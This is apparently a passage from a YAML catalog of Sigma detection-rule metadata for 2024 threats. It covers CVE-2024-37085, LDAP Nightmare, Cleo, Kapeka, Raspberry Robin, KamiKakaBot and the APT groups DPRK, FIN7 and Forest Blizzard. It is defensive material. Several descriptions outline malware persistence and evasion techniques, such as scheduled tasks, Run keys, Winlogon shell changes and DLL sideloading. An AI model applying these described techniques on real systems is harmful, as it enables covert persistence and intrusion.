  techniques: []
  tags:
  - attack.execution
  - cve.2024-37085
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 47a1658b-67a4-48e2-8ab1-c10437fc0148
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-37085/win_security_exploit_cve_2024_37085_esxi_admins_group.yml
  name: Potential Exploitation of CVE-2024-37085 - Suspicious ESX Admins Group Activity
  description: 'Detects any creation or modification to a windows domain group with
    the name "ESX Admins".

    This could indicates a potential exploitation attempt of CVE-2024-37085, which
    allows an attacker to elevate their privileges to full administrative access on
    an domain-joined ESXi hypervisor.

    VMware ESXi hypervisors joined to an Active Directory domain consider any member
    of a domain group named "ESX Admins" to have full administrative access by default.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2024-37085
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3f2c93c7-7b2a-4d58-bb8d-6f39422d8148
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-49113/win_application_error_exploit_cve_2024_49113_ldap_nightmare.yml
  name: CVE-2024-49113 Exploitation Attempt - LDAP Nightmare
  description: 'Detects exploitation attempt of CVE-2024-49113 known as LDAP Nightmare,
    based on "Application Error" log where the faulting application is "lsass.exe"
    and the faulting module is "WLDAP32.dll".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1499
  tags:
  - attack.impact
  - attack.t1499
  - cve.2024-49113
  - detection.emerging-threats
  time_window: ''
  references:
  - https://gist.github.com/travisbgreen/82b68bac499edbe0b17dcbfa0c5c71b7
  - https://www.linkedin.com/feed/update/urn:li:activity:7282295814792605698/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f007b877-02e3-45b7-8501-1b78c2864029
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Exploits/CVE-2024-50623/proc_creation_win_exploit_cve_2024_50623_cleo.yml
  name: CVE-2024-50623 Exploitation Attempt - Cleo
  description: 'Detects exploitation attempt of Cleo''s CVE-2024-50623 by looking
    for a "cmd.exe" process spawning from the Celo software suite with suspicious
    Powershell commandline.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.execution
  - attack.t1190
  - cve.2024-50623
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6f6afac3-8e7a-4e4b-9588-2608ffe08f82
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/CSharp-Streamer/image_load_malware_csharp_streamer_dotnet_load.yml
  name: Potential CSharp Streamer RAT Loading .NET Executable Image
  description: 'Detects potential CSharp Streamer RAT loading .NET executable image
    by using the default file name and path associated with the tool.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/#detections
  - https://cyber.wtf/2023/12/06/the-csharp-streamer-rat/
  false_positives:
  - Unknown
  notes: ''
- detection_id: df49c691-8026-48dd-94d3-4ba6a79102a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/DarkGate/file_event_win_malware_darkgate_autoit3_save_temp.yml
  name: DarkGate - Drop DarkGate Loader In C:\Temp Directory
  description: Detects attackers attempting to save, decrypt and execute the DarkGate
    Loader in C:\temp folder.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/hackers-exploit-windows-smartscreen-flaw-to-drop-darkgate-malware/
  - https://www.trendmicro.com/en_us/research/24/c/cve-2024-21412--darkgate-operators-exploit-microsoft-windows-sma.html
  false_positives:
  - Unlikely legitimate usage of AutoIT in temp folders.
  notes: ''
- detection_id: 2f3039c8-e8fe-43a9-b5cf-dcd424a2522d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/Generic/file_event_win_malware_generic_creation_configuration_rats.yml
  name: File Creation Related To RAT Clients
  description: 'File .conf created related to VenomRAT, AsyncRAT and Lummac samples
    observed in the wild.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/c9f9f193409217f73cc976ad078c6f8bf65d3aabcf5fad3e5a47536d47aa6761
  - https://www.virustotal.com/gui/file/e96a0c1bc5f720d7f0a53f72e5bb424163c943c24a437b1065957a79f5872675
  false_positives:
  - Legitimate software creating a file with the same name
  notes: ''
- detection_id: 24474469-bd80-46cc-9e08-9fbe81bfaaca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/KamiKakaBot/proc_creation_win_malware_kamikakabot_lnk_lure_execution.yml
  name: Potential KamiKakaBot Activity - Lure Document Execution
  description: 'Detects the execution of a Word document via the WinWord Start Menu
    shortcut.

    This behavior was observed being used by KamiKakaBot samples in order to initiate
    the 2nd stage of the infection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.nextron-systems.com/2024/03/22/unveiling-kamikakabot-malware-analysis/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fe9e8ba9-4419-41e6-a574-bd9f7b3af961
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/KamiKakaBot/proc_creation_win_malware_kamikakabot_schtasks_persistence.yml
  name: Potential KamiKakaBot Activity - Shutdown Schedule Task Creation
  description: 'Detects the creation of a schedule task that runs weekly and execute
    the "shutdown /l /f" command.

    This behavior was observed being used by KamiKakaBot samples in order to achieve
    persistence on a system.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.nextron-systems.com/2024/03/22/unveiling-kamikakabot-malware-analysis/
  - https://tria.ge/240123-rapteaahhr/behavioral1
  false_positives:
  - Unknown
  notes: ''
- detection_id: c9b86500-1ec2-4de6-9120-d744c8fb5caf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/KamiKakaBot/registry_set_malware_kamikakabot_winlogon_persistence.yml
  name: Potential KamiKakaBot Activity - Winlogon Shell Persistence
  description: 'Detects changes to the "Winlogon" registry key where a process will
    set the value of the "Shell" to a value that was observed being used by KamiKakaBot
    samples in order to achieve persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.nextron-systems.com/2024/03/22/unveiling-kamikakabot-malware-analysis/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 19b3806e-46f2-4b4c-9337-e3d8653245ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/Lummac-Stealer/proc_creation_win_malware_lummac_more_vbc.yml
  name: Lummac Stealer Activity - Execution Of More.com And Vbc.exe
  description: 'Detects the execution of more.com and vbc.exe in the process tree.

    This behavior was observed by a set of samples related to Lummac Stealer.

    The Lummac payload is injected into the vbc.exe process.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/gui/search/behaviour_processes%253A%2522C%253A%255C%255CWindows%255C%255CSysWOW64%255C%255Cmore.com%2522%2520behaviour_processes%253A%2522C%253A%255C%255CWindows%255C%255CMicrosoft.NET%255C%255CFramework%255C%255Cv4.0.30319%255C%255Cvbc.exe%2522/files
  - https://www.virustotal.com/gui/file/14d886517fff2cc8955844b252c985ab59f2f95b2849002778f03a8f07eb8aef
  - https://strontic.github.io/xcyclopedia/library/more.com-EDB3046610020EE614B5B81B0439895E.html
  - https://strontic.github.io/xcyclopedia/library/vbc.exe-A731372E6F6978CE25617AE01B143351.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0f3a9db2-c17a-480e-a723-d1f1c547ab6a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/Raspberry-Robin/image_load_malware_raspberry_robin_side_load_aclui_oleview.yml
  name: Potential Raspberry Robin Aclui Dll SideLoading
  description: 'Detects potential sideloading of malicious "aclui.dll" by OleView.This
    behavior was observed in Raspberry-Robin variants reported by chekpoint research
    on Feburary 2024.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://research.checkpoint.com/2024/raspberry-robin-keeps-riding-the-wave-of-endless-1-days/
  - https://globetech.biz/index.php/2023/05/19/evading-edr-by-dll-sideloading-in-csharp/
  - https://decoded.avast.io/threatintel/apt-treasure-trove-avast-suspects-chinese-apt-group-mustang-panda-is-collecting-data-from-burmese-government-agencies-and-opposition-groups/
  - https://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/
  - https://strontic.github.io/xcyclopedia/library/aclui.dll-F883E9CA757B622B032FDCA5BF33D0DF.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 92020b88-9caf-464f-bad8-cd0fb0aa2a81
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/Raspberry-Robin/proc_creation_win_malware_raspberry_robin_rundll32_shell32_cpl_exection.yml
  name: Potential Raspberry Robin CPL Execution Activity
  description: 'Detects the execution of a ".CPL" file located in the user temp directory
    via the Shell32 DLL "Control_RunDLL" export function.

    This behavior was observed in multiple Raspberry-Robin variants.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://tria.ge/240226-fhbe7sdc39/behavioral1
  - https://bazaar.abuse.ch/browse/signature/RaspberryRobin/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 16a4c7b3-4681-49d0-8d58-3e9b796dcb43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/Raspberry-Robin/registry_set_malware_raspberry_robin_internet_settings_zonemap_tamper.yml
  name: Potential Raspberry Robin Registry Set Internet Settings ZoneMap
  description: 'Detects registry modifications related to the proxy configuration
    of the system, potentially associated with the Raspberry Robin malware, as seen
    in campaigns running in Q1 2024.

    Raspberry Robin may alter proxy settings to circumvent security measures, ensuring
    unhindered connection with Command and Control servers for maintaining control
    over compromised systems if there are any proxy settings that are blocking connections.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.t1112
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://tria.ge/240225-jlylpafb24/behavioral1/analog?main_event=Registry&op=SetValueKeyInt
  - https://tria.ge/240307-1hlldsfe7t/behavioral2/analog?main_event=Registry&op=SetValueKeyInt
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.InternetExplorer::IZ_ProxyByPass
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.InternetExplorer::IZ_UNCAsIntranet
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.InternetExplorer::IZ_IncludeUnspecifiedLocalSites
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.InternetExplorer::SecurityPage_AutoDetect
  - https://bazaar.abuse.ch/browse/signature/RaspberryRobin/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 20228d05-dd68-435d-8b4e-e7e64938880c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/kapeka/file_event_win_malware_kapeka_backdoor_indicators.yml
  name: Potential Kapeka Decrypted Backdoor Indicator
  description: 'Detects the presence of a file that is decrypted backdoor binary dropped
    by the Kapeka Dropper, which disguises itself as a hidden file under a folder
    named "Microsoft" within "CSIDL_COMMON_APPDATA" or "CSIDL_LOCAL_APPDATA", depending
    on the process privileges.

    The file, typically 5-6 characters long with a random combination of consonants
    and vowels followed by a ".wll" extension to pose as a legitimate file to evade
    detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/kapeka
  - https://app.any.run/tasks/1efb3ed4-cc0f-4690-a0ed-24516809bc72/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a7e6b1f9-8d2c-4f1e-9a7d-63e4c8a2bf4c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/kapeka/image_load_malware_kapeka_backdoor_wll.yml
  name: Kapeka Backdoor Loaded Via Rundll32.EXE
  description: 'Detects the Kapeka Backdoor binary being loaded by rundll32.exe.

    The Kapeka loader drops a backdoor, which is a DLL with the ''.wll'' extension
    masquerading as a Microsoft Word Add-In.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  - T1218.011
  tags:
  - attack.execution
  - attack.t1204.002
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/kapeka
  - https://app.any.run/tasks/1efb3ed4-cc0f-4690-a0ed-24516809bc72/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 64a871dd-83f6-4e5f-80fc-5a7ca3a8a819
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/kapeka/proc_creation_win_malware_kapeka_backdoor_persistence.yml
  name: Kapeka Backdoor Persistence Activity
  description: 'Detects Kapeka backdoor persistence activity.

    Depending on the process privileges, the Kapeka dropper then sets persistence
    for the backdoor either as a scheduled task (if admin or SYSTEM) or autorun registry
    (if not).

    For the scheduled task, it creates a scheduled task called "Sens Api" via schtasks
    command, which is set to run upon system startup as SYSTEM.

    To establish persistence through the autorun utility, it adds an autorun entry
    called "Sens Api" under HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run via
    the "reg add" command.

    Both persistence mechanisms are set to launch the binary by calling rundll32 and
    passing the backdoor''s first export ordinal (#1) without any additional argument.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/kapeka
  - https://app.any.run/tasks/1efb3ed4-cc0f-4690-a0ed-24516809bc72/
  - https://www.virustotal.com/gui/file/bd07fb1e9b4768e7202de6cc454c78c6891270af02085c51fce5539db1386c3f/behavior
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e98f741c-6a5b-4c83-bc2a-1f4e58d07b12
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/kapeka/proc_creation_win_malware_kapeka_backdoor_rundll32_execution.yml
  name: Kapeka Backdoor Execution Via RunDLL32.EXE
  description: 'Detects Kapeka backdoor process execution pattern, where the dropper
    launch the backdoor binary by calling rundll32 and passing the backdoor''s first
    export ordinal (#1) with a "-d" argument.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/kapeka
  - https://app.any.run/tasks/1efb3ed4-cc0f-4690-a0ed-24516809bc72/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c0c67b21-eb8a-4c84-a395-40473ec3b482
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/kapeka/registry_set_malware_kapeka_backdoor_autorun_persistence.yml
  name: Kapeka Backdoor Autorun Persistence
  description: Detects the setting of a new value in the Autorun key that is used
    by the Kapeka backdoor for persistence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/kapeka
  - https://app.any.run/tasks/1efb3ed4-cc0f-4690-a0ed-24516809bc72/
  false_positives:
  - Unknown
  notes: ''
- detection_id: cbaa3ef3-07a9-4c8e-82d1-9e40578da7fd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/kapeka/registry_set_malware_kapeka_backdoor_configuration.yml
  name: Kapeka Backdoor Configuration Persistence
  description: 'Detects registry set activity of a value called "Seed" stored in the
    "\Cryptography\Providers\" registry key.

    The Kapeka backdoor leverages this location to register a new SIP provider for
    backdoor configuration persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1553.003
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1553.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/kapeka
  - https://app.any.run/tasks/1efb3ed4-cc0f-4690-a0ed-24516809bc72/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6c130acd-0adb-4545-bcc4-2e85d0883c9a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/Malware/kapeka/win_security_malware_kapeka_backdoor_scheduled_task_creation.yml
  name: Kapeka Backdoor Scheduled Task Creation
  description: Detects Kapeka backdoor scheduled task creation based on attributes
    such as paths, commands line flags, etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1053.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4698
  - https://labs.withsecure.com/publications/kapeka
  - https://app.any.run/tasks/1efb3ed4-cc0f-4690-a0ed-24516809bc72/
  - https://www.virustotal.com/gui/file/bd07fb1e9b4768e7202de6cc454c78c6891270af02085c51fce5539db1386c3f/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4d16c9a6-4362-4863-9940-1dee35f1d70f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/DPRK/dns_query_win_apt_dprk_malicious_domains.yml
  name: DPRK Threat Actor - C2 Communication DNS Indicators
  description: Detects DNS queries for C2 domains used by DPRK Threat actors.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.verfassungsschutz.de/SharedDocs/publikationen/DE/cyberabwehr/2024-02-19-joint-cyber-security-advisory-englisch.pdf?__blob=publicationFile&v=2
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6676896b-2cce-422d-82af-5a1abe65e241
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/FIN7/proc_creation_win_apt_fin7_exploitation_indicators.yml
  name: Potential APT FIN7 Exploitation Activity
  description: 'Detects potential APT FIN7 exploitation activity as reported by Google.

    In order to obtain initial access, FIN7 used compromised Remote Desktop Protocol
    (RDP) credentials to login to a target server and initiate specific Windows process
    chains.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.t1059.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://cloud.google.com/blog/topics/threat-intelligence/evolution-of-fin7/
  false_positives:
  - Notepad++ can legitimately spawn cmd (Open Containing Folder in CMD)
  notes: ''
- detection_id: b92d1d19-f5c9-4ed6-bbd5-7476709dc389
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/Forest-Blizzard/file_event_win_apt_forest_blizzard_activity.yml
  name: Forest Blizzard APT - File Creation Activity
  description: 'Detects the creation of specific files inside of ProgramData directory.

    These files were seen being created by Forest Blizzard as described by MSFT.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ec7c4e9b-9bc9-47c7-a32f-b53b598da642
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/Forest-Blizzard/file_event_win_apt_forest_blizzard_constrained_js.yml
  name: Forest Blizzard APT - JavaScript Constrained File Creation
  description: 'Detects the creation of JavaScript files inside of the DriverStore
    directory.

    Forest Blizzard used this to exploit the CVE-2022-38028 vulnerability in Windows
    Print Spooler service by modifying a JavaScript constraints file and executing
    it with SYSTEM-level permissions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 07db928c-8632-488e-ac7d-3db847489175
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/Forest-Blizzard/proc_creation_win_apt_forest_blizzard_activity.yml
  name: Forest Blizzard APT - Process Creation Activity
  description: 'Detects the execution of specific processes and command line combination.

    These were seen being created by Forest Blizzard as described by MSFT.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5cdeb555-65de-4767-99fe-e26807465148
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/Forest-Blizzard/registry_set_apt_forest_blizzard_custom_protocol_handler.yml
  name: Forest Blizzard APT - Custom Protocol Handler Creation
  description: 'Detects the setting of a custom protocol handler with the name "rogue".

    Seen being created by Forest Blizzard APT as reported by MSFT.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d807056b-0e00-4cec-b7f8-b8b7518e382b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2024/TA/Forest-Blizzard/registry_set_apt_forest_blizzard_custom_protocol_handler_dll.yml
  name: Forest Blizzard APT - Custom Protocol Handler DLL Registry Set
  description: 'Detects the setting of the DLL that handles the custom protocol handler.

    Seen being created by Forest Blizzard APT as reported by MSFT.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
